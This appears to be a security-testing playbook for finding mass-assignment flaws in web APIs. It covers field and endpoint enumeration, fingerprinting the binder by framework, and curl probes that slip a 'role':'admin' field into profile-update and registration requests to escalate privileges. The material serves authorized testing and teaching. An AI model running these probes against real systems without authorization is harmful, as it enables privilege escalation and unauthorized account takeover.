# Detection playbook — the detection sequence end to end

## Step 1 — the field inventory

```bash
# the model's self-description
curl -s -b "$JAR" "$BASE/api/me" | jq 'keys'
curl -s -b "$JAR" "$BASE/api/users/<id>" | jq 'keys'

# the bundle's constructed objects
python3 tools/web/bundle_miner.py --url <bundle> --out /tmp/b
grep -rn 'role\|admin\|balance\|verified\|price\|plan\|perm\|staff\|group' \
  /tmp/b/sources/ /tmp/b/*.js 2>/dev/null | head -30

# the schema leak
curl -X POST "$BASE/api/register" -H 'Content-Type: application/json' \
  -d '{"username":123,"password":"x"}'   # read the error's field list

# the docs
curl -s "$BASE/openapi.json" | jq '.components.schemas'
curl -s "$BASE/api/docs"
# GraphQL
curl -X POST "$BASE/graphql" -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

## Step 2 — the endpoint inventory

```bash
# the body-accepting routes
grep -rn 'app.post\|app.patch\|app.put\|router\.\|@app.route\|Route::' \
  /tmp/b/sources/ src/ routes/ 2>/dev/null
# which ones write a model — those are the binders
```

The endpoint priority: `PATCH /users/me` → `PUT /users/:id` → `POST
/register` → `POST /orders` → `/import` → GraphQL → `POST /admin/*`.

## Step 3 — the binder fingerprint

| Stack signal | Binder | Grammar |
|---|---|---|
| `X-Powered-By: Express` | merge-all or strict | flat + nested |
| `user[...]` params, `X-Runtime` | Rails strong params | `user[role]` |
| `laravel_session` | `$fillable`/`$guarded` | flat + `role[]` |
| `csrftoken`, Django errors | ModelForm vs `create(**)` | flat |
| `JSESSIONID` | bean binding | flat + nested |
| `.NET`/IIS | `[Bind]` | `Role` case-insensitive |
| Flask 500s | `**json`/`setattr` | flat JSON |

## Step 4 — the first probe

```bash
# control
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"display_name":"x"}' > ctrl.txt

# canary
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"display_name":"x","role":"admin"}' > canary.txt

# read-back
curl -b "$JAR" "$BASE/api/me" > rb.txt

# or the tool
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'username=p&password=x' --readback "$BASE/api/me"
```

## Step 5 — read the result

| `rb.txt` | Verdict | Next |
|---|---|---|
| `role:"admin"` | stored → exercise | `GET /admin` |
| `role:"user"` | endpoint falsifier | nested → form → PUT |
| `400` | schema falsifier | form → multipart |
| `role` absent | serializer-hidden | exercise directly |

## Step 6 — the falsifier map

```
dead cells                          live cells
─────────                          ─────────
POST/register json/flat    →       PATCH/me json/flat, json/nested, form
PATCH/me json/flat         →       PATCH/me json/nested, form, PUT
PATCH/me json/nested       →       PATCH/me form, /import, GraphQL
```

The falsifier depth drives the next probes — a `400` opens form/
multipart; a `200`+drop opens nested/`PATCH`; a binder-family drop
opens `/import`/GraphQL.
